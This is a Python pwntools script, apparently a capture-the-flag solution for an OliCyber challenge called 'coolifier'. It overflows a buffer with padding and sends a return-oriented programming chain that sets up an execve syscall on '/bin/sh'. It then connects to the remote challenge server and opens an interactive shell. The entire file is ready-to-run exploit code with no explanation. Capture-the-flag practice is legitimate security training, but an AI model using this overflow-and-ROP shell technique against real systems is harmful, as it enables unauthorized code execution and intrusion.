from pwn import *

context.binary = elf = ELF('coolifer/coolifier')

binsh = elf.search(b'/bin/sh').__next__() - 8

pop_rdi_add_8 = 0x4011a6
pop_rsi = 0x4011af
pop_rax_sub_37 = 0x4011bd
syscall = 0x4011c6

chain = flat([
    pop_rdi_add_8,
    binsh,

    pop_rax_sub_37,
    59 + 0x37,

    pop_rsi,
    0x0,

    syscall
])

payload = b'iamabear!'*15 + b'A'*9
payload += chain

p = remote('coolifier.challs.olicyber.it', 38068)

print(p.recvuntil(b'Message length:').decode())
p.sendline(str(len(payload)).encode())
p.recvuntil(b'Message:')
p.sendline(payload)
p.interactive()